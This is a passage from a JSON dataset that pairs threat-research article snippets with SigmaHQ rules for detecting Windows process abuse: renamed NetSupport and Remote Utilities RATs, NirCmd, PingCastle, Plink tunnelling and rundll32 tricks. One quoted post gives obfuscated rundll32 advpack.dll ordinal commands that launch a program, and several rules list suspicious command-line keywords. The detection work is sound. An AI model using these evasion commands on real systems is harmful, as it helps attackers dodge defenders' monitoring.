      "title": "Renamed NetSupport RAT Execution",
      "id": "0afbd410-de03-4078-8491-f132303cb67d",
      "status": "test",
      "description": "Detects the execution of a renamed \"client32.exe\" (NetSupport RAT) via Imphash, Product and OriginalFileName strings",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-19",
      "modified": "2024-11-23",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "Product|contains": "NetSupport Remote Control"
          },
          {
            "OriginalFileName|contains": "client32.exe"
          },
          {
            "Hashes|contains": "IMPHASH=A9D50692E95B79723F3E76FCF70D023E"
          }
        ],
        "filter": {
          "Image|endswith": "\\client32.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_netsupport_rat.yml"
  },
  "447": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
    "markdown": "# New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and research orgs **Published on January 17, 2024** --- Since November 2023, Microsoft has observed a distinct subset of Mint Sandstorm (PHOSPHORUS) targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, Mint Sandstorm used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.",
    "sigma_rule": {
      "title": "Renamed NirCmd.EXE Execution",
      "id": "264982dc-dbad-4dce-b707-1e0d3e0f73d9",
      "status": "test",
      "description": "Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.nirsoft.net/utils/nircmd.html"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2024-03-11",
      "tags": [
        "attack.execution",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "OriginalFileName": "NirCmd.exe"
        },
        "filter_main_img": {
          "Image|endswith": [
            "\\nircmd.exe",
            "\\nircmdc.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_nircmd.yml"
  },
  "448": {
    "url": "https://www.nirsoft.net/utils/nircmd.html",
    "markdown": "# NirCmd v2.87 ## See Also - SoundVolumeView - Display, change, mute, unmute the volume level of sound components on Windows 10/7/8/2008 from command line or GUI. - NK2Edit - Edit, merge and fix the AutoComplete files (.NK2) of Microsoft Outlook. ## Description NirCmd is a small command-line utility that allows you to do some useful tasks without displaying any user interface. By running NirCmd with simple command-line options, you can: - Write and delete values and keys in the Registry. - Write values into INI files. - Dial to your internet account or connect to a VPN network. -",
    "sigma_rule": {
      "title": "Renamed NirCmd.EXE Execution",
      "id": "264982dc-dbad-4dce-b707-1e0d3e0f73d9",
      "status": "test",
      "description": "Detects the execution of a renamed \"NirCmd.exe\" binary based on the PE metadata fields.",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
        "https://www.nirsoft.net/utils/nircmd.html"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2024-03-11",
      "tags": [
        "attack.execution",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "OriginalFileName": "NirCmd.exe"
        },
        "filter_main_img": {
          "Image|endswith": [
            "\\nircmd.exe",
            "\\nircmdc.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_nircmd.yml"
  },
  "449": {
    "url": "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
    "markdown": "# NetSupport Intrusion Results in Domain Compromise **Category:** netsupport **Published on:** October 30, 2023 NetSupport Manager is one of the oldest third-party remote access tools still currently on the market with over 33 years of history. This is the first time we will report on a NetSupport RAT intrusion, but malicious use of this tool dates back to at least 2016. During this report, we will analyze a case from January 2023 where a NetSupport RAT was utilized to infiltrate a network. The RAT was then used for persistence and command & control, resulting in a full domain compromise. ##",
    "sigma_rule": {
      "title": "Renamed PingCastle Binary Execution",
      "id": "2433a154-bb3d-42e4-86c3-a26bdac91c45",
      "status": "test",
      "description": "Detects the execution of a renamed \"PingCastle\" binary based on the PE metadata fields.",
      "references": [
        "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
        "https://www.pingcastle.com/documentation/scanner/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2024-01-11",
      "tags": [
        "attack.execution",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": [
              "PingCastleReporting.exe",
              "PingCastleCloud.exe",
              "PingCastle.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "--scanner aclcheck",
              "--scanner antivirus",
              "--scanner computerversion",
              "--scanner foreignusers",
              "--scanner laps_bitlocker",
              "--scanner localadmin",
              "--scanner nullsession",
              "--scanner nullsession-trust",
              "--scanner oxidbindings",
              "--scanner remote",
              "--scanner share",
              "--scanner smb",
              "--scanner smb3querynetwork",
              "--scanner spooler",
              "--scanner startup",
              "--scanner zerologon"
            ]
          },
          {
            "CommandLine|contains": "--no-enum-limit"
          },
          {
            "CommandLine|contains|all": [
              "--healthcheck",
              "--level Full"
            ]
          },
          {
            "CommandLine|contains|all": [
              "--healthcheck",
              "--server "
            ]
          }
        ],
        "filter_main_img": {
          "Image|endswith": [
            "\\PingCastleReporting.exe",
            "\\PingCastleCloud.exe",
            "\\PingCastle.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_pingcastle.yml"
  },
  "450": {
    "url": "https://www.pingcastle.com/documentation/scanner/",
    "markdown": "# Scanner ## How to scan workstations quickly Checking workstations for local admin privileges, open shares, startup time is usually complex and requires an admin. PingCastle’s scanner bypasses these classic limits. ```image Alt: PingCastle Scanner Description: The image displays a digital interface of the PingCastle scanner tool on a tablet screen. The upper portion shows a command prompt with a list of options available for scanning workstations, such as health checks and security assessments. The lower section features a Notepad window displaying results from a scan, listing various computers, their shares, and whether they are accessible or not. The layout",
    "sigma_rule": {
      "title": "Renamed PingCastle Binary Execution",
      "id": "2433a154-bb3d-42e4-86c3-a26bdac91c45",
      "status": "test",
      "description": "Detects the execution of a renamed \"PingCastle\" binary based on the PE metadata fields.",
      "references": [
        "https://thedfirreport.com/2023/10/30/netsupport-intrusion-results-in-domain-compromise/",
        "https://www.pingcastle.com/documentation/scanner/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems), X__Junior (Nextron Systems)",
      "date": "2024-01-11",
      "tags": [
        "attack.execution",
        "attack.t1059",
        "attack.defense-evasion",
        "attack.t1202"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": [
              "PingCastleReporting.exe",
              "PingCastleCloud.exe",
              "PingCastle.exe"
            ]
          },
          {
            "CommandLine|contains": [
              "--scanner aclcheck",
              "--scanner antivirus",
              "--scanner computerversion",
              "--scanner foreignusers",
              "--scanner laps_bitlocker",
              "--scanner localadmin",
              "--scanner nullsession",
              "--scanner nullsession-trust",
              "--scanner oxidbindings",
              "--scanner remote",
              "--scanner share",
              "--scanner smb",
              "--scanner smb3querynetwork",
              "--scanner spooler",
              "--scanner startup",
              "--scanner zerologon"
            ]
          },
          {
            "CommandLine|contains": "--no-enum-limit"
          },
          {
            "CommandLine|contains|all": [
              "--healthcheck",
              "--level Full"
            ]
          },
          {
            "CommandLine|contains|all": [
              "--healthcheck",
              "--server "
            ]
          }
        ],
        "filter_main_img": {
          "Image|endswith": [
            "\\PingCastleReporting.exe",
            "\\PingCastleCloud.exe",
            "\\PingCastle.exe"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_pingcastle.yml"
  },
  "451": {
    "url": "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/",
    "markdown": "# Will the Real Msiexec Please Stand Up? Exploit Leads to Data Exfiltration **Published on:** June 6, 2022 ## Introduction In this multi-day intrusion, we observed a threat actor gain initial access to an organization by exploiting a vulnerability in ManageEngine SupportCenter Plus. The threat actor discovered files on the server, dumped credentials using a web shell, moved laterally to key servers using Plink and RDP, and exfiltrated sensitive information using the web shell and RDP. The FBI and CISA published an advisory noting that APT attackers were using CVE-2021-44077 to gain initial access to the networks of organizations in",
    "sigma_rule": {
      "title": "Renamed Plink Execution",
      "id": "1c12727d-02bf-45ff-a9f3-d49806a3cf43",
      "status": "test",
      "description": "Detects the execution of a renamed version of the Plink binary",
      "references": [
        "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/",
        "https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-06",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "Plink"
          },
          {
            "CommandLine|contains|all": [
              " -l forward",
              " -P ",
              " -R "
            ]
          }
        ],
        "filter": {
          "Image|endswith": "\\plink.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_plink.yml"
  },
  "452": {
    "url": "https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html",
    "markdown": "# Chapter 7: Using the command-line connection tool Plink - Chapter 7: Using the command-line connection tool Plink - 7.1 Starting Plink - 7.2 Using Plink - 7.2.1 Using Plink for interactive logins - 7.2.2 Using Plink for automated connections - 7.2.3 Plink command line options - 7.3 Using Plink in batch files and scripts - 7.4 Using Plink with CVS - 7.5 Using Plink with WinCVS Plink (PuTTY Link) is a command-line connection tool similar to UNIX `ssh`. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably",
    "sigma_rule": {
      "title": "Renamed Plink Execution",
      "id": "1c12727d-02bf-45ff-a9f3-d49806a3cf43",
      "status": "test",
      "description": "Detects the execution of a renamed version of the Plink binary",
      "references": [
        "https://thedfirreport.com/2022/06/06/will-the-real-msiexec-please-stand-up-exploit-leads-to-data-exfiltration/",
        "https://the.earth.li/~sgtatham/putty/0.58/htmldoc/Chapter7.html"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-06-06",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "OriginalFileName": "Plink"
          },
          {
            "CommandLine|contains|all": [
              " -l forward",
              " -P ",
              " -R "
            ]
          }
        ],
        "filter": {
          "Image|endswith": "\\plink.exe"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_plink.yml"
  },
  "453": {
    "url": "https://redcanary.com/blog/threat-detection/misbehaving-rats/",
    "markdown": "# Remote access tool or trojan? How to detect misbehaving RATs The only difference between a remote administration tool and a remote access trojan (RAT) is who’s controlling it. Originally published: August 19, 2021. Last modified: October 1, 2024. --- Red Canary’s Cyber Incident Response Team frequently observes adversaries abusing legitimate remote access utilities for lateral movement and execution of payloads. These tools perform reliably, as you may expect with most enterprise software, and allow operators to pivot and transfer data to and from victim machines. Adversarial abuse of remote monitoring & management (RMM) software is not new, but—given the",
    "sigma_rule": {
      "title": "Renamed Remote Utilities RAT (RURAT) Execution",
      "id": "9ef27c24-4903-4192-881a-3adde7ff92a5",
      "status": "test",
      "description": "Detects execution of renamed Remote Utilities (RURAT) via Product PE header field",
      "references": [
        "https://redcanary.com/blog/threat-detection/misbehaving-rats/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-19",
      "modified": "2023-02-03",
      "tags": [
        "attack.defense-evasion",
        "attack.collection",
        "attack.command-and-control",
        "attack.discovery",
        "attack.s0592"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Product": "Remote Utilities"
        },
        "filter": {
          "Image|endswith": [
            "\\rutserv.exe",
            "\\rfusclient.exe"
          ]
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_renamed_rurat.yml"
  },
  "454": {
    "url": "https://web.archive.org/web/20220215183046/https://twitter.com/Hexacorn/status/1224848930795552769",
    "markdown": "# Post Feb 5, 2020 Stay positive Lolbins... not! http://hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/ #LOLBIN ``` rundll32 advpack.dll, RegisterOCX calc.exe rundll32 advpack.dll, #12 calc.exe rundll32 advpack.dll, #+12 calc.exe rundll32 advpack.dll, #-4294967284 calc.exe ``` ## Comment Feb 4, 2020 all right, since no one asks...a bonus for 64-bit rundll32 you can use rundll32 advpack.dll, #-1152921504606846964 calc.exe ### Comment Feb 11, 2020 also, FWIW rundll32.exe DLL, <num_no_hash> - won't work; rundll32 expects '#' after coma still, this will load DLL and execute DllEntryPoint anyway many blank characters between coma and hash are okay. rundll32 advpack.dll,#12 calc.exe rundll32 advpack.dll, #12 calc.exe",
    "sigma_rule": {
      "title": "Suspicious Advpack Call Via Rundll32.EXE",
      "id": "a1473adb-5338-4a20-b4c3-126763e2d3d3",
      "status": "test",
      "description": "Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function",
      "references": [
        "https://web.archive.org/web/20220215183046/https://twitter.com/Hexacorn/status/1224848930795552769",
        "http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": "rundll32"
          }
        ],
        "selection_cli_dll": {
          "CommandLine|contains": "advpack"
        },
        "selection_cli_ordinal": [
          {
            "CommandLine|contains|all": [
              "#+",
              "12"
            ]
          },
          {
            "CommandLine|contains": "#-"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yml"
  },
  "455": {
    "url": "http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/",
    "markdown": "# Stay positive Lolbins… not! Posted on 2020-02-05 by adam --- **Update** After I posted this, a number of comments on Twitter followed; there was an interesting development from @sixtyvividtails: ```image Alt: sixtyvividtails Description: The image displays a screenshot from a program called Hiew, showing the disassembly of the rundll32.exe function. The highlighted section contains assembly code that illustrates how the function processes commands. Key instructions such as 'mov', 'push', and 'cmp' are visible, indicating the flow of data and operations within the executable. This technical detail is relevant to the discussion of leveraging lolbins (living off the land binaries)",
    "sigma_rule": {
      "title": "Suspicious Advpack Call Via Rundll32.EXE",
      "id": "a1473adb-5338-4a20-b4c3-126763e2d3d3",
      "status": "test",
      "description": "Detects execution of \"rundll32\" calling \"advpack.dll\" with potential obfuscated ordinal calls in order to leverage the \"RegisterOCX\" function",
      "references": [
        "https://web.archive.org/web/20220215183046/https://twitter.com/Hexacorn/status/1224848930795552769",
        "http://www.hexacorn.com/blog/2020/02/05/stay-positive-lolbins-not/"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-05-17",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          },
          {
            "CommandLine|contains": "rundll32"
          }
        ],
        "selection_cli_dll": {
          "CommandLine|contains": "advpack"
        },
        "selection_cli_ordinal": [
          {
            "CommandLine|contains|all": [
              "#+",
              "12"
            ]
          },
          {
            "CommandLine|contains": "#-"
          }
        ],
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_advpack_obfuscated_ordinal_call.yml"
  },
  "456": {
    "url": "https://www.microsoft.com/en-us/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/",
    "markdown": "# GoldMax, GoldFinder, and Sibot: Analyzing NOBELIUM’s layered persistence **March 4, 2021** --- ### April 2023 update **Microsoft Threat Intelligence** has shifted to a new threat actor naming taxonomy aligned around the theme of weather. NOBELIUM is now tracked as **Midnight Blizzard**. ### April 15, 2021 update We updated this blog with new indicators of compromise, including files, domains, and C2 decoy traffic, released by Cybersecurity & Infrastructure Security Agency (CISA) in Malware Analysis Report MAR-10327841-1.v1 – SUNSHUTTLE. --- Microsoft continues to work with partners and customers to expand our knowledge of the threat actor behind the nation-state cyberattacks that",
    "sigma_rule": {
      "title": "Suspicious Rundll32 Invoking Inline VBScript",
      "id": "1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd",
      "status": "test",
      "description": "Detects suspicious process related to rundll32 based on command line that invokes inline VBScript as seen being used by UNC2452",
      "references": [
        "https://www.microsoft.com/en-us/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2021-03-05",
      "modified": "2022-10-09",
      "tags": [
        "attack.defense-evasion",
        "attack.t1055"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "CommandLine|contains|all": [
            "rundll32.exe",
            "Execute",
            "RegRead",
            "window.close"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_inline_vbs.yml"
  },
  "457": {
    "url": "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
    "markdown": "# Raspberry Robin gets the worm early Red Canary is tracking a worm spread by external drives that leverages Windows Installer to reach out to QNAP-associated domains and download a malicious DLL. *Originally published May 5, 2022. Last modified October 2, 2024.* --- Since fall 2021, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Raspberry Robin was the seventh most prevalent threat we observed in 2022, as reported in our 2023 Threat Detection Report. Read on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how",
    "sigma_rule": {
      "title": "Rundll32 Spawned Via Explorer.EXE",
      "id": "1723e720-616d-4ddc-ab02-f7e3685a4713",
      "status": "test",
      "description": "Detects execution of \"rundll32.exe\" with a parent process of Explorer.exe. This has been observed by variants of Raspberry Robin, as first reported by Red Canary.",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "CD_ROM_",
      "date": "2022-05-21",
      "modified": "2023-08-31",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\explorer.exe"
        },
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          }
        ],
        "filter_main_generic": [
          {
            "CommandLine|contains": " C:\\Windows\\System32\\"
          },
          {
            "CommandLine|endswith": " -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617"
          }
        ],
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_parent_explorer.yml"
  },
  "458": {
    "url": "https://thedfirreport.com/2022/09/26/bumblebee-round-two/",
    "markdown": "# BumbleBee: Round Two **Categories:** adfind, bumblebee, cobaltstrike, Meterpreter **Published on:** September 26, 2022 In this intrusion from May 2022, the threat actors used BumbleBee as the initial access vector. BumbleBee has been identified as an initial access vector utilized by several ransomware affiliates. In this intrusion, we see the threat actor use BumbleBee to deploy Cobalt Strike and Meterpreter. The threat actor then used RDP and SMB to move around the network looking at backup systems and file shares before being evicted from the network. ## Case Summary The intrusion began with the delivery of an ISO file containing",
    "sigma_rule": {
      "title": "Rundll32 Spawned Via Explorer.EXE",
      "id": "1723e720-616d-4ddc-ab02-f7e3685a4713",
      "status": "test",
      "description": "Detects execution of \"rundll32.exe\" with a parent process of Explorer.exe. This has been observed by variants of Raspberry Robin, as first reported by Red Canary.",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://thedfirreport.com/2022/09/26/bumblebee-round-two/"
      ],
      "author": "CD_ROM_",
      "date": "2022-05-21",
      "modified": "2023-08-31",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_parent": {
          "ParentImage|endswith": "\\explorer.exe"
        },
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          }
        ],
        "filter_main_generic": [
          {
            "CommandLine|contains": " C:\\Windows\\System32\\"
          },
          {
            "CommandLine|endswith": " -localserver 22d8c27b-47a1-48d1-ad08-7da7abd79617"
          }
        ],
        "condition": "all of selection_* and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_parent_explorer.yml"
  },
  "459": {
    "url": "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/",
    "markdown": "# This LOLBIN doesn’t exist… Posted on 2023-06-07 I have written about Nullsoft installer a few times before. I am a bit fascinated by it, because there is not that much research about it, in general, and even less – about its esoteric, yet omnipresent DLL plug-ins… One of the more interesting plug-ins that I know of, and yet, one that you will never really see residing on any system, is… *ShellDispatch.dll*. It’s a rarely used Nullsoft Plug-In DLL that is known to be used by the installer of WinAmp, yes.. THE WinAmp… and even there… it is used temporarily,",
    "sigma_rule": {
      "title": "Potential ShellDispatch.DLL Functionality Abuse",
      "id": "82343930-652f-43f5-ab70-2ee9fdd6d5e9",
      "status": "test",
      "description": "Detects potential \"ShellDispatch.dll\" functionality abuse to execute arbitrary binaries via \"ShellExecute\"",
      "references": [
        "https://www.hexacorn.com/blog/2023/06/07/this-lolbin-doesnt-exist/"
      ],
      "author": "X__Junior (Nextron Systems)",
      "date": "2023-06-20",
      "tags": [
        "attack.execution",
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "Image|endswith": "\\rundll32.exe"
          },
          {
            "OriginalFileName": "RUNDLL32.EXE"
          }
        ],
        "selection_cli": {
          "CommandLine|contains": "RunDll_ShellExecuteW"
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unlikely"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_shelldispatch_potential_abuse.yml"
  },
  "460": {
    "url": "https://redcanary.com/blog/intelligence-insights-november-2021/",
    "markdown": "## Intelligence Insights: November 2021 Compromised NPM package distributes cryptominer, TR delivers SquirrelWaffle, and Gamarue rises up the threat ranks. **Originally published** November 18, 2021. Last modified April 30, 2024. --- Each month, the Intel team provides Red Canary customers with an analysis of trending, emerging, or otherwise important threats that we’ve encountered in confirmed threat detections, intelligence reporting, and elsewhere over the preceding month. We call this report our “Intelligence Insights” and share a public version of it with the broader infosec community. ### Highlights In October 2021, we observed the same threats we’ve grown accustomed to seeing each",
    "sigma_rule": {
      "title": "RunDLL32 Spawning Explorer",
      "id": "caa06de8-fdef-4c91-826a-7f9e163eef4b",
      "status": "test",
      "description": "Detects RunDLL32.exe spawning explorer.exe as child, which is very uncommon, often observes Gamarue spawning the explorer.exe process in an unusual way",
      "references": [
        "https://redcanary.com/blog/intelligence-insights-november-2021/"
      ],
      "author": "elhoim, CD_ROM_",
      "date": "2022-04-27",
      "modified": "2022-05-25",
      "tags": [
        "attack.defense-evasion",
        "attack.t1218.011"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "ParentImage|endswith": "\\rundll32.exe",
          "Image|endswith": "\\explorer.exe"
        },
        "filter": {
          "ParentCommandLine|contains": "\\shell32.dll,Control_RunDLL"
        },
        "condition": "selection and not filter"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_spawn_explorer.yml"
  },
  "461": {
    "url": "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
    "markdown": "# Raspberry Robin gets the worm early Red Canary is tracking a worm spread by external drives that leverages Windows Installer to reach out to QNAP-associated domains and download a malicious DLL. *Originally published May 5, 2022. Last modified October 2, 2024.* --- Since fall 2021, Red Canary Intelligence has been tracking a cluster of malicious activity we call Raspberry Robin. Raspberry Robin was the seventh most prevalent threat we observed in 2022, as reported in our 2023 Threat Detection Report. Read on for details on what Raspberry Robin is, high-fidelity opportunities to detect known behaviors, and background on how",
    "sigma_rule": {
      "title": "Suspicious Usage Of ShellExec_RunDLL",
      "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
      "related": [
        {
          "id": "36c5146c-d127-4f85-8e21-01bf62355d5a",
          "type": "obsolete"
        },
        {
          "id": "8823e85d-31d8-473e-b7f4-92da070f0fc6",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects suspicious usage of the ShellExec_RunDLL function to launch other commands as seen in the the raspberry-robin attack",
      "references": [
        "https://redcanary.com/blog/threat-intelligence/raspberry-robin/",
        "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
        "https://github.com/SigmaHQ/sigma/issues/1009"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2022-09-01",
      "modified": "2022-12-30",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "category": "process_creation",
        "product": "windows"
      },
      "detection": {
        "selection_openasrundll": {
          "CommandLine|contains": "ShellExec_RunDLL"
        },
        "selection_suspcli": {
          "CommandLine|contains": [
            "\\Desktop\\",
            "\\Temp\\",
            "\\Users\\Public\\",
            "comspec",
            "iex",
            "Invoke-",
            "msiexec",
            "odbcconf",
            "regsvr32"
          ]
        },
        "condition": "all of selection_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_rundll32_susp_shellexec_execution.yml"
  },
  "462": {
    "url": "https://www.microsoft.com/en-us/security/blog/2022/10/27/raspberry-robin-worm-part-of-larger-ecosystem-facilitating-pre-ransomware-activity/",
    "markdown": "# Raspberry Robin worm part of larger ecosystem facilitating pre-ransomware activity **October 27, 2022** --- > **April 2023 update** – Microsoft Threat Intelligence has shifted to a new threat actor naming taxonomy aligned around the theme of weather. > > - **DEV-0206** is now tracked as **Mustard Tempest** > - **DEV-0243** is now tracked as **Manatee Tempest** > - **DEV-0950** is now tracked as **Lace Tempest** > - **DEV-0651** is now tracked as **Storm-0651** > - **DEV-0856** is now tracked as **Storm-0856** > > To learn about how the new taxonomy represents the origin, unique traits, and impact of threat",
    "sigma_rule": {
      "title": "Suspicious Usage Of ShellExec_RunDLL",
      "id": "d87bd452-6da1-456e-8155-7dc988157b7d",
